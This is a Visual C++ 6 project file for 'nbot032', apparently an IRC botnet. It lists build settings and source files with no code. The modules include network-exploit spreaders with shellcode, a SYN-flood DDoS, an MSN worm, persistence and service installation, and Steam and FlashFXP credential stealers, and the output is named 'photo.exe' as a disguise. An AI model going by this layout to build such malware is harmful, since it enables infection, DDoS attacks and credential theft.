# Microsoft Developer Studio Project File - Name="nbot032" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=nbot032 - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "nbot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "nbot.mak" CFG="nbot032 - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "nbot032 - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "nbot032 - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "nbot032 - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 Ws2_32.lib Advapi32.lib kernel32.lib user32.lib gdi32.lib mpr.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /out:"bin/photo.exe" /align:4096
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "nbot032 - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "nbot032___Win32_Debug"
# PROP BASE Intermediate_Dir "nbot032___Win32_Debug"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "nbot032___Win32_Debug"
# PROP Intermediate_Dir "nbot032___Win32_Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /Gi /GX /Od /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 Ws2_32.lib Advapi32.lib kernel32.lib user32.lib gdi32.lib mpr.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib /nologo /subsystem:windows /incremental:yes /map /debug /machine:I386 /ignore:4108 /ignore:4108 /align:4096
# SUBTRACT LINK32 /pdb:none

!ENDIF 

# Begin Target

# Name "nbot032 - Win32 Release"
# Name "nbot032 - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "spreader files"

# PROP Default_Filter ""
# Begin Group "dETOX Scanner only!"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\dcom2.cpp
# End Source File
# Begin Source File

SOURCE=.\netapi.cpp
# End Source File
# Begin Source File

SOURCE=.\scanner.cpp
# End Source File
# Begin Source File

SOURCE=.\Shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\Transfer.cpp
# End Source File
# End Group
# Begin Group "DDOS"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\SkySyn.cpp
# End Source File
# End Group
# Begin Group "BlowFish"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\BlowFish.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\zip.cpp
# End Source File
# End Group
# Begin Group "Mods"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\base64.cpp
# End Source File
# Begin Source File

SOURCE=.\BlowTest.cpp
# End Source File
# Begin Source File

SOURCE=.\Delay.cpp
# End Source File
# Begin Source File

SOURCE=.\FakeIRCD.cpp
# End Source File
# Begin Source File

SOURCE=.\Globals.cpp
# End Source File
# Begin Source File

SOURCE=.\HoneyPot.cpp
# End Source File
# Begin Source File

SOURCE=.\Hosts.cpp
# End Source File
# Begin Source File

SOURCE=.\MSNWorm.cpp
# End Source File
# Begin Source File

SOURCE=.\Persist.cpp
# End Source File
# Begin Source File

SOURCE=.\Registry.cpp
# End Source File
# Begin Source File

SOURCE=.\Service.cpp
# End Source File
# Begin Source File

SOURCE=.\Steam.cpp
# End Source File
# Begin Source File

SOURCE=.\steaminfo.cpp
# End Source File
# Begin Source File

SOURCE=.\Thead2.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\download.cpp
# End Source File
# Begin Source File

SOURCE=.\FlashFxp.cpp
# End Source File
# Begin Source File

SOURCE=.\nbot.cpp
# End Source File
# Begin Source File

SOURCE=.\other.cpp
# End Source File
# Begin Source File

SOURCE=.\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\uninstall.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter ""
# Begin Group "spreader headers"

# PROP Default_Filter ""
# Begin Group "Detox"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\dcom2.h
# End Source File
# Begin Source File

SOURCE=.\netapi.h
# End Source File
# Begin Source File

SOURCE=.\scanner.h
# End Source File
# Begin Source File

SOURCE=.\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\transfer.h
# End Source File
# End Group
# Begin Group "Blowfish No. 1"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Blowfish.h
# End Source File
# End Group
# Begin Group "Steams0beit"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\base64.h
# End Source File
# Begin Source File

SOURCE=.\steam.h
# End Source File
# Begin Source File

SOURCE=.\steam_.h
# End Source File
# Begin Source File

SOURCE=.\steaminfo.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\msn.h
# End Source File
# Begin Source File

SOURCE=.\zip.h
# End Source File
# End Group
# Begin Group "DDOS No. 1"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\SkySyn.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\config.h
# End Source File
# Begin Source File

SOURCE=.\defines.h
# End Source File
# Begin Source File

SOURCE=.\download.h
# End Source File
# Begin Source File

SOURCE=.\extern.h
# End Source File
# Begin Source File

SOURCE=.\fakeIRCD.h
# End Source File
# Begin Source File

SOURCE=.\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\Honeypot.h
# End Source File
# Begin Source File

SOURCE=.\includes.h
# End Source File
# Begin Source File

SOURCE=.\moduleincludes.h
# End Source File
# Begin Source File

SOURCE=.\nbot.h
# End Source File
# Begin Source File

SOURCE=.\nnbot.h
# End Source File
# Begin Source File

SOURCE=.\other.h
# End Source File
# Begin Source File

SOURCE=.\registry.h
# End Source File
# Begin Source File

SOURCE=.\service.h
# End Source File
# Begin Source File

SOURCE=.\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\thread.h
# End Source File
# Begin Source File

SOURCE=.\threads.h
# End Source File
# Begin Source File

SOURCE=.\uninstall.h
# End Source File
# End Group
# End Target
# End Project
